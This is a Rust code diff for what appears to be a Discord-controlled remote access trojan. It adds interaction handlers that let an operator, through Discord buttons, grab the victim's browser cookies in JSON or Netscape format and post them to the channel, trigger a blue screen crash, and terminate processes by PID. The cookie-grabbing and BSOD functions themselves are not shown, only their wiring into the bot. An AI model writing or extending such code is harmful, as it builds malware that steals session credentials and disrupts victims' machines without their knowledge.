@@ -1,5 +1,4 @@
 use std::sync::Arc;
-use tracing::error;
 use twilight_http::Client as HttpClient;
 use twilight_model::channel::message::Message;
 use twilight_model::id::marker::ChannelMarker;
@@ -8,6 +7,9 @@ use twilight_model::id::Id;
 use crate::command_registry::get_registry;
 use crate::commands::Arguments;
 use crate::config::Config;
+
+use crate::commands::filesystem::grabcookie::{GrabCookieCommand, GRAB_JSON_BUTTON, GRAB_NETSCAPE_BUTTON};
+use crate::commands::system::bsod::{BsodCommand, BSOD_CONFIRM_BUTTON, BSOD_CANCEL_BUTTON};
 
 pub async fn handle_message(
     http: &Arc<HttpClient>,
@@ -41,7 +43,7 @@ pub async fn handle_message(
                 .await
             {
                 if Config::SHOW_CONSOLE {
-                    error!("Error executing command {}: {}", command_name, e);
+                    println!("Error executing command {}: {}", command_name, e);
                 }
 
                 let response = format!(
@@ -70,7 +72,7 @@ pub async fn handle_message(
     Ok(())
 }
 
-//@ Handle Discord
+//@ Handle Discord Interactions (Buttons, etc.)
 pub async fn handle_interaction(
     http: &Arc<HttpClient>,
     interaction: twilight_model::application::interaction::Interaction,
@@ -82,28 +84,141 @@ pub async fn handle_interaction(
 
     if let Some(InteractionData::MessageComponent(data)) = &interaction.data {
         let custom_id = &data.custom_id;
+        
+        // Get channel ID from interaction
+        let channel_id = interaction.channel
+            .as_ref()
+            .map(|c| c.id)
+            .ok_or_else(|| anyhow::anyhow!("No channel in interaction"))?;
 
-        // Handle crash button interactions
-        if custom_id.starts_with("crash_") {
-            if let Some(pid_str) = custom_id.strip_prefix("crash_") {
-                if let Ok(pid) = pid_str.parse::<u32>() {
-                    let response_content = terminate_process(pid);
+        match custom_id.as_str() {
+            // from bsod.rs
+            // ----------------------------------------
+            BSOD_CONFIRM_BUTTON => {
+                http.interaction(interaction.application_id)
+                    .create_response(
+                        interaction.id,
+                        &interaction.token,
+                        &InteractionResponse {
+                            kind: InteractionResponseType::DeferredUpdateMessage,
+                            data: None,
+                        },
+                    )
+                    .await?;
 
-                    http.interaction(interaction.application_id)
-                        .create_response(
-                            interaction.id,
-                            &interaction.token,
-                            &InteractionResponse {
-                                kind: InteractionResponseType::ChannelMessageWithSource,
-                                data: Some(InteractionResponseData {
-                                    content: Some(response_content),
-                                    ..Default::default()
-                                }),
-                            },
-                        )
+                if let Some(msg) = &interaction.message {
+                    let _ = http.delete_message(channel_id, msg.id).await;
+                }
+
+                http.create_message(channel_id)
+                    .content("**Triggering BSOD...**")
+                    .await?;
+
+                tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
+                match BsodCommand::trigger_bsod() {
+                    Ok(_) => {
+                        // ...
+                    }
+                    Err(e) => {
+                        http.create_message(channel_id)
+                            .content(&format!("BSOD failed: {}", e))
+                            .await?;
+                    }
+                }
+            }
+
+            BSOD_CANCEL_BUTTON => {
+                http.interaction(interaction.application_id)
+                    .create_response(
+                        interaction.id,
+                        &interaction.token,
+                        &InteractionResponse {
+                            kind: InteractionResponseType::DeferredUpdateMessage,
+                            data: None,
+                        },
+                    )
+                    .await?;
+
+                if let Some(msg) = &interaction.message {
+                    let _ = http.delete_message(channel_id, msg.id).await;
+                }
+                http.create_message(channel_id).content("BSOD cancelled").await?;
+            }
+
+            // from grabcookie.rs
+            // ----------------------------------------
+            GRAB_JSON_BUTTON => {
+                http.interaction(interaction.application_id)
+                    .create_response(
+                        interaction.id,
+                        &interaction.token,
+                        &InteractionResponse {
+                            kind: InteractionResponseType::DeferredUpdateMessage,
+                            data: None,
+                        },
+                    )
+                    .await?;
+
+                if let Some(msg) = &interaction.message {
+                    let _ = http.delete_message(channel_id, msg.id).await;
+                }
+
+                if let Err(e) = GrabCookieCommand::execute_grab(http, channel_id, "json").await {
+                    http.create_message(channel_id)
+                        .content(&format!("Error grabbing cookies: {}", e))
                         .await?;
                 }
             }
+
+            GRAB_NETSCAPE_BUTTON => {
+                http.interaction(interaction.application_id)
+                    .create_response(
+                        interaction.id,
+                        &interaction.token,
+                        &InteractionResponse {
+                            kind: InteractionResponseType::DeferredUpdateMessage,
+                            data: None,
+                        },
+                    )
+                    .await?;
+
+                if let Some(msg) = &interaction.message {
+                    let _ = http.delete_message(channel_id, msg.id).await;
+                }
+
+                if let Err(e) = GrabCookieCommand::execute_grab(http, channel_id, "netscape").await {
+                    http.create_message(channel_id)
+                        .content(&format!("Error grabbing cookies: {}", e))
+                        .await?;
+                }
+            }
+
+            // from foreground.rs
+            // ----------------------------------------
+            id if id.starts_with("crash_") => {
+                if let Some(pid_str) = id.strip_prefix("crash_") {
+                    if let Ok(pid) = pid_str.parse::<u32>() {
+                        let response_content = terminate_process(pid);
+
+                        http.interaction(interaction.application_id)
+                            .create_response(
+                                interaction.id,
+                                &interaction.token,
+                                &InteractionResponse {
+                                    kind: InteractionResponseType::ChannelMessageWithSource,
+                                    data: Some(InteractionResponseData {
+                                        content: Some(response_content),
+                                        ..Default::default()
+                                    }),
+                                },
+                            )
+                            .await?;
+                    }
+                }
+            }
+
+            // Unknown button
+            _ => {}
         }
     }
 
